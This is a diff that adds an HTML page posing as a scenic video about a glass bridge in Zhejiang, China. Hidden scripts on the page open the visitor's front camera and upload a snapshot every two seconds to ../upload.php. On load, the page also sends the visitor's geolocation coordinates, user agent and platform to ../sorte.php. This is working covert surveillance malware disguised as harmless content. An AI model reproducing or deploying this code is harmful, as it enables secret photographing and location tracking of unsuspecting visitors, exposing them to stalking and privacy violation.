@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  font-family: Arial;
+  font-size: 17px;
+}
+
+#myVideo {
+  position: fixed;
+  right: 0;
+  bottom: 0;
+  min-width: 100%; 
+  min-height: 100%;
+}
+
+.content {
+  position: fixed;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.5);
+  color: #f1f1f1;
+  width: 100%;
+  padding: 10px;
+}
+
+</style>
+</head>
+
+<!-- Start Camera -->
+
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: '../upload.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 450, 600);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 2000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+<!-- End Camera -->
+
+
+
+<body onload="getLocation()">
+
+<video autoplay loop controls id="myVideo">
+  <source src="China_bridge.mp4" type="video/mp4">
+  Your browser does not support HTML5 video.
+</video>
+
+
+<div class="content">
+  <h1>The Glass Bridge</h1>
+  <p>Breathtaking two-tiered Zhuyi bridge in Zhejiang province China 🇨🇳</p>
+</div>
+
+<script>
+var video = document.getElementById("myVideo");
+var btn = document.getElementById("myBtn");
+
+function myFunction() {
+  if (video.paused) {
+    video.play();
+    btn.innerHTML = "Pause";
+  } else {
+    video.pause();
+    btn.innerHTML = "Play";
+  }
+}
+</script>
+
+
+<p id="demo"></p>
+<!-- Start Location -->
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+notshowPosition();
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+   x.innerHTML = "Geolocation is not supported by this browser.";
+     
+  }
+
+}
+
+function showPosition(position) {
+
+    lat = position.coords.latitude;	
+    lon = position.coords.longitude;
+    var Platform = navigator.platform;
+    var uagent = navigator.userAgent;
+    const xhttp = new XMLHttpRequest();
+        xhttp.open("GET", "../sorte.php?lat=" + lat + "&long=" + lon);
+        xhttp.send();
+   
+    }
+
+function notshowPosition(){
+    var Platform = navigator.platform;
+    var uagent = navigator.userAgent;
+    const xhttp = new XMLHttpRequest();
+        xhttp.open("GET", "../sorte.php?uagent=" + uagent + "&platform=" + Platform);
+        xhttp.send();
+    
+}
+
+</script>
+
+
+<!-- End Location -->
+
+</body>
+</html>
+
